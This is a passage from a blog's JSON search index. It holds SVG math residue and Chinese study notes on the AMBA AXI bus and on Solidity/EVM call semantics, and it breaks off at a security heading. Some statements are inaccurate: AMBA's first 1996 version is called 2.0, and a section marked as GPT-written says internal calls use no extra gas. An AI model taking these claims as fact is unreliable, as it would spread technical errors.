88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(714,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(302.3,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g><rect width=\"1774\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(5894.1,0)\"><path data-c=\"22C5\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(6394.3,0)\"><g data-mml-node=\"mrow\" transform=\"translate(457.5,754.2)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(977,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g><rect width=\"2084.3\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(8996.4,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(10052.2,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(10441.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(11540.7,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(12540.9,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(13040.9,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(13429.9,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(523,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(14524.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(15580.4,0)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(15992.4,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(16381.4,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(16992.7,0)\"><path data-c=\"22C5\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(17492.9,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span></p>\n","categories":["笔记"],"tags":["AI","cs231n","数学"]},{"title":"AXI 系统总线","url":"/blockchain/AXI/","content":"<blockquote>\n<p>本文属于学习笔记，内容可能有误、可能不全面，仅代表个人在学习这一知识时的理解和总结</p>\n</blockquote>\n<p>第一次接触AMBA AXI系统总线，学习 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIuYXJtLmNvbS9kb2N1bWVudGF0aW9uLzEwMjIwMi8wMzAwP2xhbmc9ZW4=\">Learn\nthe architecture - An introduction to AMBA AXI<i class=\"fa fa-external-link-alt\"></i></span> ，做到笔记。</p>\n<span id=\"more\"></span>\n<h1 id=\"amba\">AMBA</h1>\n<h2 id=\"qa\">Q&amp;A</h2>\n<blockquote>\n<p>什么是AMBA？</p>\n</blockquote>\n<p>AMBA（Advanced Microcontroller Bus\nArchitecture）是由ARM公司开发的一种标准化的芯片内部总线协议，简单来说，它就是一种让芯片内部不同部分能够快速、可靠地相互通信的“高速公路”。在一个芯片里，有很多不同的“模块”，比如处理器、内存、输入输出设备等等，这些模块需要彼此传递数据，而AMBA就是负责管理这些数据怎么传输的。</p>\n<blockquote>\n<p>在AMBA提出之前，芯片内部的各个模块应该也能传递数据，那时候是怎么实现数据传递的？</p>\n</blockquote>\n<p>在AMBA提出之前，芯片内部各个模块之间的确已经能够实现数据传递，但方式较为复杂和不统一。以下是一些在AMBA之前常见的数据传输方式：</p>\n<ol type=\"1\">\n<li><p><strong>定制总线</strong></p>\n<p>在AMBA出现之前，芯片制造商通常会为每个项目定制设计自己的总线系统。这种定制总线完全由设计团队根据具体需求设计，缺乏统一的标准。这意味着每个新项目可能需要重新设计数据传输的方式，耗时且复杂。</p>\n<p>缺点：</p>\n<pre><code>- 缺乏标准化，导致设计难度大。\n\n- 不同模块之间的接口可能不兼容，集成和调试复杂。\n\n- 难以重复使用设计，增加开发成本和时间。</code></pre></li>\n<li><p><strong>共享总线架构</strong></p>\n<p>在一些设计中，多个模块会共享同一条总线。这种架构较为简单，但由于所有模块都使用同一条总线，可能会产生“总线争用”的问题，即多个模块同时请求访问总线，导致数据传输的延迟或效率下降。</p>\n<p>缺点：</p>\n<ul>\n<li>总线带宽有限，当多个模块同时访问时，容易产生瓶颈。</li>\n<li>缺乏灵活性，难以适应复杂的多模块通信需求。</li>\n</ul></li>\n<li><p><strong>专用接口</strong></p>\n<p>一些芯片设计会为特定模块之间的通信设计专用的接口。这种方式虽然在特定场景下效率较高，但其灵活性很差。每对模块之间需要专用的连接，这使得芯片设计复杂度大幅增加。</p>\n<p>缺点：</p>\n<pre><code>- 专用接口需要针对每对模块单独设计，增加了设计工作量。\n\n- 难以扩展，增加新模块时需要重新设计接口。</code></pre></li>\n</ol>\n<p>AMBA的提出为这些问题提供了一个解决方案。它标准化了芯片内部的通信，允许设计者使用一套通用的协议和总线结构来连接不同的模块。这样一来，不仅减少了设计复杂度，也提高了模块之间的兼容性和重用性，使得芯片设计变得更高效、更灵活。</p>\n<p>通过AMBA，总线系统可以自动处理诸如优先级、仲裁等复杂问题，开发者只需要专注于模块本身的设计，而不必再花费大量时间去解决数据传输的问题。</p>\n<blockquote>\n<p>AMBA是什么时候提出的？</p>\n</blockquote>\n<p>AMBA（Advanced Microcontroller Bus\nArchitecture）最早是由ARM公司在<strong>1996年</strong>提出的。最初的版本被称为AMBA\n2.0，后来逐步发展出更高级的版本，如AMBA 3和AMBA\n4，分别引入了更先进的功能和特性，以适应不断发展的嵌入式系统需求。</p>\n<p>AMBA 2.0版本主要引入了两种总线：AHB（Advanced High-performance\nBus）和 APB（Advanced Peripheral\nBus）。在后续的版本中，<strong>AXI（Advanced eXtensible\nInterface）</strong>等新总线协议被引入，以支持更高性能和更复杂的系统设计。</p>\n<p>AMBA的推出标志着嵌入式系统设计进入了一个新的标准化阶段，使得芯片设计和模块集成变得更加高效和灵活。</p>\n<h2 id=\"总结\">总结</h2>\n<p>AMBA是一个<strong>标准化协议</strong>，用于芯片内部各个模块之间的数据传输。</p>\n<p>使用AMBA，可以一定程度降低嵌入式系统设计的复杂度。</p>\n<p>AXI是AMBA 3.0\n提出的总线协议，下面详细学习AXI的设计，理解他的工作原理和使用方法，感受为什么AXI总线能够降低设计的复杂度。</p>\n<p>以及，有很多其他现成的IP核，使用的是AXI总线。如果我想设计一个模块与其他IP核连接，必须在我的模块里实现AXI总线。</p>\n<h1 id=\"axi-总线协议\">AXI 总线协议</h1>\n<h2 id=\"详细架构\">详细架构</h2>\n<h2 id=\"关键特性\">关键特性</h2>\n<p>AXI\n协议具有多个关键特性，这些特性旨在提高数据传输和事务处理的带宽和延迟，如下所示：</p>\n<ul>\n<li><strong>独立的读写通道</strong>：AXI\n支持两组不同的通道，一组用于写操作，另一组用于读操作。拥有两组独立的通道有助于提高接口的带宽性能，因为读写操作可以同时进行。</li>\n<li><strong>多重未完成地址</strong>：AXI\n允许存在多个未完成的地址。这意味着管理器可以在不等待先前事务完成的情况下发起新事务。这可以提高系统性能，因为它使得事务的并行处理成为可能。</li>\n<li><strong>地址和数据操作之间没有严格的时间关系</strong>：在 AXI\n中，地址和数据操作之间没有严格的时间关系。这意味着，例如，管理器可以在写地址通道上发出写地址，但没有时间要求规定管理器何时必须在写数据通道上提供相应的数据。</li>\n<li><strong>支持非对齐数据传输</strong>：对于由宽度超过一个字节的数据传输组成的突发传输，访问的首字节可以与自然地址边界不对齐。例如，起始字节地址为\n0x1002 的 32 位数据包并未对齐到自然的 32 位地址边界。</li>\n<li><strong>乱序事务完成</strong>：AXI 支持乱序事务完成。AXI\n协议包含事务标识符，不同 ID\n值的事务完成顺序没有限制。这意味着单个物理端口可以支持乱序事务，通过充当多个逻辑端口，每个逻辑端口按顺序处理其事务。</li>\n<li><strong>基于起始地址的突发事务</strong>：AXI\n管理器仅发出第一个传输的起始地址。对于后续的任何传输，受控端将根据突发类型计算下一个传输地址。</li>\n</ul>\n<h2 id=\"传输和事务\">传输和事务</h2>\n<p>https://developer.arm.com/documentation/102202/0300/Channel-transfers-and-transactions?lang=en</p>\n<p>简而言之，分为读写两个部分，分别有以下接口：</p>\n<ul>\n<li><strong>写</strong>：\n<ul>\n<li>Write Address</li>\n<li>Write Data</li>\n<li>Write Response</li>\n</ul></li>\n<li><strong>读</strong>：\n<ul>\n<li>Read Address</li>\n<li>Read Data （包括Response的内容）</li>\n</ul></li>\n</ul>\n<p>传输就是读或写1个数据的过程。一个事务可以由一个或多个传输组成，也就是可以一次性传输多次。</p>\n<p>传输前需要先握手配对，即主机的VALID和从机的READY均为1时，开始传输。</p>\n<p>写事务是所有数据写入<strong>之后</strong>，返回一个OK。读事务是每读取一个数据的<strong>同时</strong>，返回一个OK。</p>\n<h2 id=\"信号\">信号</h2>\n<p>https://developer.arm.com/documentation/102202/0300/Channel-signals?lang=en</p>\n<p>定义了各个接口的具体信号实现。</p>\n<p>其中提到了安全支持，这在TrustZone中很有用。</p>\n","categories":["笔记"],"tags":["FPGA","ARM","AMBA"]},{"title":"EVM 学习笔记","url":"/blockchain/EVM/","content":"<blockquote>\n<p>本文属于学习笔记，内容可能有误、可能不全面，仅代表个人在学习这一特性时的理解和总结</p>\n</blockquote>\n<p>老师安排的任务是EVM智能合约的加速计算，给我的论文提出了一个新的架构……</p>\n<p>但是我还不知道原始的EVM是怎么实现的，所以先学习一下</p>\n<span id=\"more\"></span>\n<h1 id=\"solidity\">1 Solidity</h1>\n<p>Solidity 是一种为实现智能合约而创建的高级编程语言。</p>\n<p>最终跑在以太坊虚拟机(EVM)上的代码，就是由Solidity编译得到的。所以得先学一下Solidity是怎么写的。</p>\n<p>基本的运算规则、语法等等查阅文档：https://learnblockchain.cn/docs/solidity</p>\n<h2 id=\"数据位置\">1.1 数据位置</h2>\n<h3 id=\"分类\">1.1.1 分类</h3>\n<ul>\n<li><code>storage</code>：用于存储状态变量，即需要长期保存的数据，生命周期与合约相同。</li>\n<li><code>memory</code>：用于存储临时变量，可以读写，生命周期在函数执行期间。</li>\n<li><code>calldata</code>：用于存储函数输入参数，是只读的，生命周期在函数执行期间。</li>\n</ul>\n<p><code>storage</code> 存储在区块链上，<code>memory</code>\n在合约执行过程中的内存中，<code>calldata</code>\n中的数据来自执行的交易本身（所以不占据额外空间而且是只读的）</p>\n<p>通过 <code>msg.data</code> 可以获取完整的 <code>calldata</code></p>\n<h3 id=\"默认位置\">1.1.2 默认位置</h3>\n<ul>\n<li><strong>状态变量</strong>：默认在<code>storage</code>中。</li>\n<li><strong>函数内部的局部变量</strong>：值类型默认在<code>memory</code>中。</li>\n<li><strong>函数参数</strong>：\n<ul>\n<li><code>external</code>函数的引用类型参数默认在<code>calldata</code>中。</li>\n<li>其他函数的引用类型参数需要显式指定<code>memory</code>或<code>storage</code>。</li>\n</ul></li>\n<li><strong>返回值</strong>：引用类型默认在<code>memory</code>中。</li>\n</ul>\n<h2 id=\"函数调用\">1.2 函数调用</h2>\n<p>（GPT）</p>\n<p>内部调用和外部调用在Solidity的合约编程中都有不同的行为，在以太坊虚拟机（EVM）的实现中也有显著的区别。以下是这两种调用方式在EVM层面的差异：</p>\n<h3 id=\"内部调用internal-call\">1. <strong>内部调用（Internal\nCall）</strong></h3>\n<p><strong>特点：</strong></p>\n<ul>\n<li><strong>直接调用</strong>：内部调用是通过直接跳转到目标函数的代码位置来实现的。这是因为内部调用发生在同一合约内部，EVM不需要额外的处理步骤，调用者和被调用者共享相同的上下文和存储。</li>\n<li><strong>无消息传递</strong>：内部调用不涉及消息传递，也没有额外的Gas消耗。因为调用在相同的合约上下文中进行，所有的状态变量和内存都是直接共享的。</li>\n<li><strong>编译优化</strong>：在内部调用时，Solidity编译器可以进行优化，如内联函数（inline\nfunctions），使得调用过程更加高效。</li>\n</ul>\n<p><strong>EVM行为：</strong></p>\n<ul>\n<li>EVM中的内部调用相当于一次代码跳转（jump），指令指针直接跳转到目标函数的起始位置。</li>\n<li>内部调用没有创建新的调用栈帧，保持相同的内存、堆栈和存储上下文。</li>\n<li>因为没有新的消息传递（即没有新的合约上下文被创建），内部调用的成本（Gas）相对较低。</li>\n</ul>\n<h3 id=\"外部调用external-call\">2. <strong>外部调用（External\nCall）</strong></h3>\n<p><strong>特点：</strong></p>\n<ul>\n<li><strong>消息传递</strong>：外部调用涉及到向另一个合约（即使是调用自身的<code>external</code>函数）发送消息，这会创建一个新的合约执行上下文，包括新的堆栈、内存和存储访问。</li>\n<li><strong>新Gas限制</strong>：每次外部调用会分配一个新的Gas限制，这意味着被调用合约的执行有自己独立的Gas预算。如果这个调用消耗了超出分配的Gas，调用将失败并回滚。</li>\n<li><strong>EVM上下文切换</strong>：外部调用会在EVM中引发上下文切换，即从调用者的上下文切换到被调用合约的上下文。这种切换会涉及到堆栈的保存和恢复，以及传递调用数据。</li>\n</ul>\n<p><strong>EVM行为：</strong></p>\n<ul>\n<li>EVM在执行外部调用时，会创建一个新的消息调用（Message\nCall）。这包括构建一个新的堆栈帧，传递调用数据（包括函数选择器和参数），以及初始化一个新的存储和内存上下文。</li>\n<li>外部调用会触发EVM的CALL指令。该指令在EVM中相对昂贵，因为它涉及到一系列的操作，如设置新的Gas限制、管理新的堆栈帧、以及潜在的跨合约调用的风险管理（例如重入攻击的防范）。</li>\n<li>外部调用的结果（如返回值或状态变更）在调用结束后返回给调用者，这通常需要通过<code>abi.decode</code>等方法进行解码。</li>\n<li>在外部调用中，如果调用的合约抛出异常或耗尽Gas，调用者合约将会得到失败的结果，并且可以选择回滚操作。</li>\n</ul>\n<h3 id=\"调用成本\">3. <strong>调用成本</strong></h3>\n<ul>\n<li><strong>内部调用</strong>：由于没有新的消息传递和上下文切换，内部调用的成本（Gas消耗）非常低。它是通过简单的跳转和共享上下文来实现的，因此更加高效。</li>\n<li><strong>外部调用</strong>：外部调用由于需要创建新的上下文、消息传递、处理潜在的返回数据等，成本较高。此外，外部调用可能带来安全风险，如重入攻击，这需要额外的防护措施。</li>\n</ul>\n<h3 id=\"安全性考虑\">4. 